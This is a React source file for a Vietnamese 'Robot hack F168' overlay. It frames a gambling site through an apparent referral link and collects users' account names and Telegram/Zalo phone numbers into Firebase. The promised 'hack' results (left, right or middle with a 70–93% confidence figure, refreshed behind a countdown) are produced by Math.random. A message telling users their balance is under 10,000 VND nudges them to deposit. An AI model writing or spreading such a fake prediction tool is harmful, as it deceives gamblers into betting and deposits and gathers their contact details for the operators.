import React, { useState, useEffect, useRef } from 'react';
import { Box, TextField, Button, Typography, Paper, Grid, IconButton, Divider } from '@mui/material';
import { collection, doc, getDoc, setDoc } from 'firebase/firestore';
import { db } from './firebase';
import MinimizeIcon from '@mui/icons-material/Minimize';
import AccountCircleIcon from '@mui/icons-material/AccountCircle';
import PhoneIcon from '@mui/icons-material/Phone';
import PlayArrowIcon from '@mui/icons-material/PlayArrow';

function App() {
  const [username, setUsername] = useState('');
  const [contact, setContact] = useState('');
  const [type, setType] = useState(0);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isMinimized, setIsMinimized] = useState(false);
  const [result, setResult] = useState('');
  const [countdown, setCountdown] = useState(10);
  const [position, setPosition] = useState({ x: 20, y: 20 });
  const [isDragging, setIsDragging] = useState(false);
  const [dragOffset, setDragOffset] = useState({ x: 0, y: 0 });
  const avatarRef = useRef(null);
  const resultRef = useRef(null);
  const [touchStartTime, setTouchStartTime] = useState(0);
  const [touchStartPosition, setTouchStartPosition] = useState({ x: 0, y: 0 });
  const iframeRef = useRef(null);
  const [iframeSrc, setIframeSrc] = useState("https://m.f16878.vip/?id=616801259&currency=VND&type=2");

  const getRandomResult = () => {
    const sides = ['Trái', 'Phải', 'Giữa'];
    const percentage = Math.floor(Math.random() * (93 - 70 + 1)) + 70;
    return `${sides[Math.floor(Math.random() * 3)]} (${percentage}%)`;
  };

  useEffect(() => {
    let interval;
    let countdownInterval;
    if (isSubmitted && type === 1) {
      // Cập nhật kết quả ngay lập tức
      setResult(getRandomResult());
      setCountdown(10);

      // Thiết lập interval để cập nhật mỗi 10 giây
      interval = setInterval(() => {
        setResult(getRandomResult());
        setCountdown(10);
      }, 10000);

      // Thiết lập interval cho countdown
      countdownInterval = setInterval(() => {
        setCountdown(prev => (prev > 0 ? prev - 1 : 10));
      }, 1000);
    }

    return () => {
      if (interval) {
        clearInterval(interval);
      }
      if (countdownInterval) {
        clearInterval(countdownInterval);
      }
    };
  }, [isSubmitted, type]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    try {
      // Kiểm tra xem username đã tồn tại chưa
      const userDoc = await getDoc(doc(db, 'users', username));
      
      if (!userDoc.exists()) {
        // Nếu tài khoản chưa tồn tại, thêm mới
        await setDoc(doc(db, 'users', username), {
          username,
          contact,
          type: 0,
          timestamp: new Date()
        });
      } else {
        // Nếu tài khoản đã tồn tại, lấy giá trị type từ Firebase
        setType(userDoc.data().type);
      }
      
      setIsSubmitted(true);
    } catch (error) {
      console.error('Error: ', error);
    }
  };

  const handleMouseDown = (e) => {
    const targetRef = e.target.closest('.minimized-avatar') ? avatarRef : resultRef;
    if (e.target === targetRef.current || 
        (e.target.closest('.draggable-area') && !e.target.closest('.minimize-button')) ||
        e.target.closest('.minimized-avatar')) {
      e.preventDefault();
      setIsDragging(true);
      const rect = targetRef.current.getBoundingClientRect();
      const clientX = e.clientX || e.touches[0].clientX;
      const clientY = e.clientY || e.touches[0].clientY;
      setDragOffset({
        x: clientX - rect.left,
        y: clientY - rect.top
      });

      // Lưu thời gian và vị trí bắt đầu chạm cho mobile
      if (e.touches) {
        setTouchStartTime(Date.now());
        setTouchStartPosition({
          x: e.touches[0].clientX,
          y: e.touches[0].clientY
        });
      }
    }
  };

  const handleTouchEnd = (e) => {
    const touchEndTime = Date.now();
    const touchDuration = touchEndTime - touchStartTime;
    
    // Nếu thời gian chạm ngắn (dưới 200ms) và không di chuyển nhiều (dưới 10px) thì coi là click
    if (touchDuration < 200 && e.changedTouches) {
      const touchEndX = e.changedTouches[0].clientX;
      const touchEndY = e.changedTouches[0].clientY;
      const moveDistance = Math.sqrt(
        Math.pow(touchEndX - touchStartPosition.x, 2) +
        Math.pow(touchEndY - touchStartPosition.y, 2)
      );
      
      if (moveDistance < 10) {
        setIsMinimized(false);
      }
    }
    
    setIsDragging(false);
  };

  const handleMouseMove = (e) => {
    if (!isDragging) return;
    e.preventDefault();
    const clientX = e.clientX || e.touches[0].clientX;
    const clientY = e.clientY || e.touches[0].clientY;
    setPosition({
      x: clientX - dragOffset.x,
      y: clientY - dragOffset.y
    });
  };

  const handleMouseUp = (e) => {
    if (isDragging) {
      e.preventDefault();
    }
    setIsDragging(false);
  };

  useEffect(() => {
    if (isDragging) {
      window.addEventListener('mousemove', handleMouseMove);
      window.addEventListener('mouseup', handleMouseUp);
      window.addEventListener('touchmove', handleMouseMove);
      window.addEventListener('touchend', handleMouseUp);
    } else {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('mouseup', handleMouseUp);
      window.removeEventListener('touchmove', handleMouseMove);
      window.removeEventListener('touchend', handleMouseUp);
    }
    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('mouseup', handleMouseUp);
      window.removeEventListener('touchmove', handleMouseMove);
      window.removeEventListener('touchend', handleMouseUp);
    };
  }, [isDragging, dragOffset]);

  const handleIframeLoad = () => {
    try {
      const iframe = iframeRef.current;
      const links = iframe.querySelectorAll("a");
      links.forEach(link => {
        link.setAttribute("target", "_self");
      });
    } catch (e) {
      console.warn("Không thể chỉnh sửa iframe (CORS).");
    }
  };

  return (
    <div style={{ 
      width: '100%', 
      height: '100vh',
      overflow: 'hidden',
      position: 'fixed'
    }}>
      <iframe
        ref={iframeRef}
        src={iframeSrc}
        onLoad={handleIframeLoad}
        style={{ 
          width: '100%', 
          height: '100%', 
          border: 'none',
          overflow: 'hidden',
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          userSelect: 'none',
          WebkitUserSelect: 'none',
          MozUserSelect: 'none',
          msUserSelect: 'none',
          touchAction: 'none',
          WebkitTouchCallout: 'none',
          WebkitUserDrag: 'none',
          WebkitTapHighlightColor: 'transparent',
          WebkitTextSizeAdjust: 'none',
          textSizeAdjust: 'none',
          fontSizeAdjust: 'none',
          WebkitFontSmoothing: 'antialiased',
          MozOsxFontSmoothing: 'grayscale'
        }}
        title="F168 Frame"
        scrolling="no"
        sandbox="allow-scripts allow-same-origin allow-popups allow-forms"
      />
      
      {/* Avatar Component */}
      <Box
        ref={avatarRef}
        onMouseDown={handleMouseDown}
        onTouchStart={handleMouseDown}
        onTouchEnd={handleTouchEnd}
        style={{
          position: 'fixed',
          left: `${position.x}px`,
          top: `${position.y}px`,
          zIndex: 1000,
          cursor: isDragging ? 'grabbing' : 'grab',
          touchAction: 'none'
        }}
      >
        <img
          className="minimized-avatar"
          src="/icon.png"
          alt="Avatar"
          style={{ 
            width: '60px', 
            height: '60px', 
            cursor: isDragging ? 'grabbing' : 'grab',
            WebkitTapHighlightColor: 'transparent',
            userSelect: 'none'
          }}
          onClick={() => !isDragging && setIsMinimized(false)}
        />
      </Box>

      {/* Result Component */}
      {!isMinimized && (
        <div
          ref={resultRef}
          style={{
            position: 'fixed',
            left: `${position.x + 70}px`, // Offset to the right of the avatar
            top: `${position.y}px`,
            zIndex: 1000
          }}
        >
          <Paper
            elevation={3}
            style={{
              padding: '20px',
              width: '300px',
              backgroundColor: 'white',
              transition: 'all 0.3s ease',
              borderRadius: '15px'
            }}
          >
            <Box 
              className="draggable-area"
              onMouseDown={handleMouseDown}
              onTouchStart={handleMouseDown}
              style={{ 
                position: 'absolute', 
                top: 0, 
                left: 0, 
                right: 0, 
                height: '40px',
                cursor: isDragging ? 'grabbing' : 'grab',
                touchAction: 'none'
              }}
            >
              <Box style={{ position: 'absolute', top: 0, right: 0 }}>
                <IconButton 
                  className="minimize-button"
                  onClick={() => setIsMinimized(true)}
                  style={{ 
                    touchAction: 'auto',
                    WebkitTapHighlightColor: 'transparent'
                  }}
                >
                  <MinimizeIcon />
                </IconButton>
              </Box>
            </Box>

            {!isSubmitted ? (
              <form onSubmit={handleSubmit}>
                <Box textAlign="center" mb={3}>
                  <Typography 
                    variant="h5" 
                    style={{ 
                      fontWeight: 'bold',
                      color: '#1976d2'
                    }}
                  >
                    Robot hack F168
                  </Typography>
                </Box>

                <Box mb={2}>
                  <Box display="flex" alignItems="center" mb={1}>
                    <AccountCircleIcon style={{ color: '#1976d2', marginRight: '8px' }} />
                    <Typography variant="body2" style={{ color: '#666' }}>
                      Tên tài khoản
                    </Typography>
                  </Box>
                  <TextField
                    fullWidth
                    variant="outlined"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    required
                    InputProps={{
                      style: {
                        borderRadius: '10px',
                        backgroundColor: '#f5f5f5'
                      }
                    }}
                  />
                </Box>

                <Box mb={3}>
                  <Box display="flex" alignItems="center" mb={1}>
                    <PhoneIcon style={{ color: '#1976d2', marginRight: '8px' }} />
                    <Typography variant="body2" style={{ color: '#666' }}>
                      Số điện thoại Telegram/Zalo
                    </Typography>
                  </Box>
                  <TextField
                    fullWidth
                    variant="outlined"
                    value={contact}
                    onChange={(e) => setContact(e.target.value)}
                    required
                    InputProps={{
                      style: {
                        borderRadius: '10px',
                        backgroundColor: '#f5f5f5'
                      }
                    }}
                  />
                </Box>

                <Button
                  type="submit"
                  variant="contained"
                  color="primary"
                  fullWidth
                  style={{
                    borderRadius: '10px',
                    padding: '10px',
                    fontWeight: 'bold',
                    textTransform: 'none',
                    fontSize: '16px'
                  }}
                  startIcon={<PlayArrowIcon />}
                >
                  Bắt đầu
                </Button>
              </form>
            ) : (
              <Box>
                <Typography variant="body1" style={{ fontWeight: 'bold', marginBottom: '10px' }}>
                  {type === 0
                    ? "Không để đọc kết quả do số dư tài khoản F168 < 10.000VND"
                    : `Kết quả: ${result}`}
                </Typography>
                {type === 1 && (
                  <Typography variant="body2" style={{ color: '#666', marginBottom: '10px' }}>
                    Đợi {countdown} giây phân tích
                  </Typography>
                )}
                <Button
                  variant="contained"
                  color="secondary"
                  fullWidth
                  style={{
                    borderRadius: '10px',
                    padding: '10px',
                    fontWeight: 'bold',
                    textTransform: 'none',
                    fontSize: '16px'
                  }}
                  onClick={() => setIsSubmitted(false)}
                >
                  Kết thúc
                </Button>
              </Box>
            )}
          </Paper>
        </div>
      )}
    </div>
  );
}

export default App;
